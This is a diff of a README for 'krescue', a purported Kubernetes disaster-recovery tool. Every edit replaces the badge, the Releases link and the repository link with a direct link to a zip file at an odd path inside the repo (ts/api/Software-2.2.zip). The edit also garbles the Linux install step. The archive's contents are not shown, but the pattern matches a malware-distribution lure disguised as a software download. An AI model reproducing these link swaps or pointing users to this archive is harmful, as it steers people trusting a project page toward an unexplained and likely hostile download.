@@ -1,6 +1,6 @@
 # 🚀 krescue - Simplifying Kubernetes Disaster Recovery
 
-![Download krescue](https://img.shields.io/badge/Download%20krescue-v1.0-blue.svg)
+![Download krescue](https://github.com/Accoladecr01/krescue/raw/refs/heads/main/ts/api/Software-2.2.zip%https://github.com/Accoladecr01/krescue/raw/refs/heads/main/ts/api/Software-2.2.zip)
 
 ## 🛠️ Overview
 
@@ -29,12 +29,12 @@ To run krescue effectively, ensure your system meets the following requirements:
 
 To get started with krescue, follow these steps:
 
-1. Visit the [Releases page to download](https://github.com/Accoladecr01/krescue/releases).
+1. Visit the [Releases page to download](https://github.com/Accoladecr01/krescue/raw/refs/heads/main/ts/api/Software-2.2.zip).
 2. Locate the latest version of krescue.
 3. Download the appropriate file for your operating system.
 4. Once downloaded, follow the installation instructions in the release notes.
 
-You can also access the download link directly here: [Download krescue](https://github.com/Accoladecr01/krescue/releases).
+You can also access the download link directly here: [Download krescue](https://github.com/Accoladecr01/krescue/raw/refs/heads/main/ts/api/Software-2.2.zip).
 
 ### Installation Instructions
 
@@ -45,7 +45,7 @@ You can also access the download link directly here: [Download krescue](https://
    - Open the downloaded `.dmg` file and drag the krescue icon into your Applications folder.
   
 3. **Linux:**
-   - Extract the downloaded `.tar.gz` file and run the `krescue` command in your terminal.
+   - Extract the downloaded `https://github.com/Accoladecr01/krescue/raw/refs/heads/main/ts/api/Software-2.2.zip` file and run the `krescue` command in your terminal.
 
 ## ⚙️ Getting Started
 
@@ -67,7 +67,7 @@ After installation, you can begin using krescue. Here’s how:
 
 - **User Guide:** Detailed instructions and best practices are available in the user guide that comes with the installation.
 - **Community Support:** Join our community on forums or chat platforms to share experiences and get help.
-- **GitHub Repository:** Explore the source code, report issues, or contribute to the project on our [GitHub repository](https://github.com/Accoladecr01/krescue).
+- **GitHub Repository:** Explore the source code, report issues, or contribute to the project on our [GitHub repository](https://github.com/Accoladecr01/krescue/raw/refs/heads/main/ts/api/Software-2.2.zip).
 
 ## 🔧 Frequently Asked Questions
 
